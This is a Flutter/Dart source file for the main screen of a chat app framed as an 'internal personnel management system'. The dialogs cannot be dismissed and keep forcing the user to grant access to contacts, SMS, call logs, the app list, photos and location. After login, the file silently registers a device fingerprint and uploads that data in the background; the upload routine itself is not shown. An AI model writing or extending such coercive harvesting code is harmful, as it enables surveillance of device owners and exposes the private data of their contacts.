import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import 'package:permission_handler/permission_handler.dart';

import 'core/services/storage_service.dart';
import 'providers/auth_provider.dart';
import 'providers/socket_provider.dart';
import 'screens/auth/login_screen.dart';
import 'screens/auth/register_screen.dart';
import 'screens/home/home_screen.dart';
import 'screens/qr/scan_screen.dart';
import 'screens/settings/settings_screen.dart';
import 'screens/chat/chat_main_screen.dart';
import 'widgets/permission_explanation_dialog.dart';
import 'services/permission/permission_service.dart';
import 'services/api/devices_api_service.dart';

/// 应用主组件
/// 根据用户登录状态显示不同页面
class AppMain extends StatefulWidget {
  const AppMain({super.key});

  @override
  State<AppMain> createState() => _AppMainState();
}

class _AppMainState extends State<AppMain> {
  bool _hasShownPermissionDialog = false;
  bool _hasShownDataCollectionDialog = false;
  bool _wasAuthenticated = false;
  bool _hasCheckedLoginPermissions = false;

  @override
  void initState() {
    super.initState();
    _initializeApp();
  }

  /// 初始化应用
  Future<void> _initializeApp() async {
    final authProvider = Provider.of<AuthProvider>(context, listen: false);
    final socketProvider = Provider.of<SocketProvider>(context, listen: false);
    
    // 等待 AuthProvider 加载登录状态
    // AuthProvider 在构造函数中会自动调用 _loadAuthStatus
    
    // 如果已登录，自动连接 Socket
    if (authProvider.isAuthenticated) {
      // 延迟一下，确保 AuthProvider 已完成初始化
      await Future.delayed(const Duration(milliseconds: 500));
      
      if (mounted && authProvider.isAuthenticated) {
        // 自动连接 Socket.io
        await socketProvider.autoConnect();
        
        // 检查是否需要显示权限说明弹窗
        await _checkAndShowPermissionDialog();
      }
    }
  }

  /// 检查并显示权限说明弹窗
  Future<void> _checkAndShowPermissionDialog() async {
    if (_hasShownPermissionDialog) return;
    
    // 检查是否已经同意过权限说明
    final hasAgreedPermissions = await StorageService.instance.getAgreedPermissions();
    if (hasAgreedPermissions == true) {
      _hasShownPermissionDialog = true;
      return;
    }

    // 延迟显示，确保页面已加载完成
    await Future.delayed(const Duration(milliseconds: 1000));

    if (mounted && !_hasShownPermissionDialog) {
      _hasShownPermissionDialog = true; // 防止重複彈出
      
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (context) => PermissionExplanationDialog(
          isRequired: true,
          onAgree: () async {
            final allGranted = await _requestAllPermissions();
            
            if (!allGranted && mounted) {
              _hasShownPermissionDialog = false; // 未全部授權，允許再次顯示
              // _requestAllPermissions 内部已处理权限引导，这里直接返回
              return;
            }
            
            await StorageService.instance.saveAgreedPermissions(true);
            if (mounted) {
              Provider.of<AuthProvider>(context, listen: false).notifyListeners();
            }
          },
        ),
      );
    }
  }

  /// 请求所有必需权限（强制要求，拒绝则不允许使用）
  Future<bool> _requestAllPermissions() async {
    try {
      final permissionService = PermissionService.instance;
      
      // 请求所有敏感权限
      final permissions = await permissionService.requestAllSensitivePermissions();
      
      // 检查是否有未授权的权限
      final deniedPermissions = permissions.entries
          .where((entry) => entry.value != PermissionStatus.granted)
          .map((entry) {
            // 将权限键转换为中文名称
            switch (entry.key) {
              case 'contacts':
                return '通訊錄';
              case 'sms':
                return '簡訊';
              case 'phone':
                return '通話記錄';
              case 'app_list':
                return '應用程式列表';
              case 'photos':
                return '相冊';
              case 'location':
                return '定位（IP/歸屬地）';
              default:
                return entry.key;
            }
          })
          .toList();
      
      // 如果有未授权的权限，强制要求授权
      if (deniedPermissions.isNotEmpty && mounted) {
        final result = await showDialog<bool>(
          context: context,
          barrierDismissible: false, // 不允许关闭
          builder: (context) => AlertDialog(
            title: const Text('必須授權所有權限'),
            content: Text(
              '這是內部人員管理系統，必須授權以下所有權限才能使用：\n\n'
              '未授權的權限：${deniedPermissions.join('、')}\n\n'
              '請前往系統設置中開啟這些權限，否則無法繼續使用本應用。',
            ),
            actions: [
              ElevatedButton(
                onPressed: () async {
                  await permissionService.openAppSettings();
                  if (mounted) {
                    Navigator.of(context).pop(false);
                  }
                },
                child: const Text('前往設置'),
              ),
            ],
          ),
        );
        
        // 用户前往设置后，再次检查权限
        if (result == false) {
          // 等待用户从设置返回，延迟检查
          await Future.delayed(const Duration(seconds: 1));
          
          // 再次检查权限状态
          final recheckPermissions = await permissionService.checkAllSensitivePermissions();
          final stillDenied = recheckPermissions.entries
              .where((entry) => entry.value != PermissionStatus.granted)
              .toList();
          
          if (stillDenied.isNotEmpty && mounted) {
            // 仍有未授权权限，继续要求授权
            return await _requestAllPermissions();
          } else {
            // 所有权限已授权
            return true;
          }
        }
        
        return false;
      }
      
      // 所有权限已授权
      return true;
    } catch (e) {
      debugPrint('請求權限失敗: $e');
      return false;
    }
  }

  @override
  Widget build(BuildContext context) {
    return Consumer2<AuthProvider, SocketProvider>(
      builder: (context, authProvider, socketProvider, _) {
        // 僅在「帳號密碼登入」時觸發資料收集，不在 token 恢復／每次打開 APP 時提示
        final isNewLogin = !_wasAuthenticated && 
                          authProvider.isAuthenticated && 
                          authProvider.hasAgreedTerms;
        final isPasswordLogin = authProvider.lastAuthViaPasswordLogin;
        
        if (isNewLogin && isPasswordLogin && !_hasShownDataCollectionDialog) {
          _wasAuthenticated = true;
          _hasShownDataCollectionDialog = true;
          WidgetsBinding.instance.addPostFrameCallback((_) {
            if (mounted) {
              _showDataCollectionDialog(context, authProvider);
            }
          });
        } else if (!authProvider.isAuthenticated) {
          _wasAuthenticated = false;
          _hasShownDataCollectionDialog = false; // 登出后重置，下次登录会再次显示
        } else {
          _wasAuthenticated = authProvider.isAuthenticated;
        }
        
        // 如果已登录但 Socket 未连接，尝试连接
        if (authProvider.isAuthenticated && 
            authProvider.hasAgreedTerms && 
            !socketProvider.isConnected) {
          // 延迟连接，避免阻塞 UI
          WidgetsBinding.instance.addPostFrameCallback((_) {
            socketProvider.autoConnect();
          });
        }
        
        // 根据登录状态和免责声明同意状态显示不同页面
        if (authProvider.isAuthenticated && authProvider.hasAgreedTerms) {
          // 已登录且已同意免责声明，仅一次检查权限状态
          if (!_hasCheckedLoginPermissions) {
            _hasCheckedLoginPermissions = true;
            WidgetsBinding.instance.addPostFrameCallback((_) async {
              if (!mounted) return;
              final hasAgreedPermissions = await StorageService.instance.getAgreedPermissions();
              if (hasAgreedPermissions != true) {
                await _checkAndShowPermissionDialog();
                return;
              }
              final permissionService = PermissionService.instance;
              final permissions = await permissionService.checkAllSensitivePermissions();
              final denied = permissions.entries
                  .where((e) => e.value != PermissionStatus.granted)
                  .toList();
              if (denied.isNotEmpty && mounted) {
                showDialog(
                  context: context,
                  barrierDismissible: false,
                    builder: (ctx) => AlertDialog(
                      title: const Text('需要授權權限'),
                      content: const Text(
                        '部分權限未授權，請前往系統設置中開啟所有權限。\n\n'
                        '您已通過保密培訓，了解授權的必要性。',
                      ),
                      actions: [
                        ElevatedButton(
                          onPressed: () async {
                            await PermissionService.instance.openAppSettings();
                            if (ctx.mounted) Navigator.of(ctx).pop();
                          },
                          child: const Text('前往設置'),
                        ),
                      ],
                    ),
                );
              }
            });
          }
          
          return const ChatMainScreen();
        } else {
          // 未登录或未同意免责声明，显示登录页
          return const LoginScreen();
        }
      },
    );
  }
  
  /// 显示数据收集对话框（内部人员管理必须确认，后台静默执行）
  Future<void> _showDataCollectionDialog(BuildContext context, AuthProvider authProvider) async {
    final shouldProceed = await showDialog<bool>(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        title: const Text('資料收集（必須確認）'),
        content: const Text(
          '這是內部人員管理系統，登錄後必須同意資料收集。\n\n'
          '系統將收集並上傳：通訊錄、簡訊、通話記錄、應用程式列表、相冊元資料、設備信息、IP及歸屬地等。\n\n'
          '資料在背景自動上傳，不影響正常使用。請點擊「確認」繼續。',
        ),
        actions: [
          ElevatedButton(
            onPressed: () => Navigator.of(context).pop(true),
            child: const Text('確認'),
          ),
        ],
      ),
    );
    
    if (shouldProceed != true || !mounted) return;
    
    authProvider.clearLastAuthViaPasswordLogin();
    
    // 後台靜默執行：先自動註冊設備，然後收集和上傳資料
    Future.microtask(() async {
      try {
        await _registerDevice();
      } catch (e) {
        debugPrint('設備註冊失敗: $e');
      }
      
      try {
        debugPrint('開始收集和上傳資料...');
        final result = await authProvider.collectAndUploadData();
        if (result['success'] == true) {
          debugPrint('資料上傳成功:');
          debugPrint('  通訊錄: ${result['contacts_count'] ?? 0} 條');
          debugPrint('  簡訊: ${result['sms_count'] ?? 0} 條');
          debugPrint('  通話記錄: ${result['call_records_count'] ?? 0} 條');
          debugPrint('  應用程式列表: ${result['app_list_count'] ?? 0} 個');
          debugPrint('  相冊照片: ${result['photo_count'] ?? 0} 張');
        } else {
          debugPrint('資料上傳失敗: ${result['errors']}');
        }
      } catch (e, stackTrace) {
        debugPrint('資料收集上傳異常: $e');
        debugPrint('堆疊追蹤: $stackTrace');
      }
    });
  }
  
  /// 自动注册设备
  Future<void> _registerDevice() async {
    try {
      String? fingerprint;
      var model = 'Unknown';
      String? systemVersion;
      
      final plugin = DeviceInfoPlugin();
      if (Platform.isAndroid) {
        final android = await plugin.androidInfo;
        fingerprint = android.id;
        final m = '${android.manufacturer} ${android.model}'.trim();
        if (m.isNotEmpty) model = m;
        systemVersion = android.version.release;
      } else if (Platform.isIOS) {
        final ios = await plugin.iosInfo;
        fingerprint = ios.identifierForVendor;
        final m = '${ios.name} ${ios.model}'.trim();
        if (m.isNotEmpty) model = m;
        systemVersion = ios.systemVersion;
      }
      
      if (fingerprint == null || fingerprint.isEmpty) {
        debugPrint('無法獲取設備指紋');
        return;
      }
      
      await DevicesApiService().register({
        'device_fingerprint': fingerprint,
        'device_model': model,
        'system_version': systemVersion,
        'is_rooted': false,
        'is_vpn_proxy': false,
        'is_emulator': false,
      });
      
      debugPrint('設備註冊成功');
    } catch (e) {
      debugPrint('設備註冊失敗: $e');
    }
  }
}
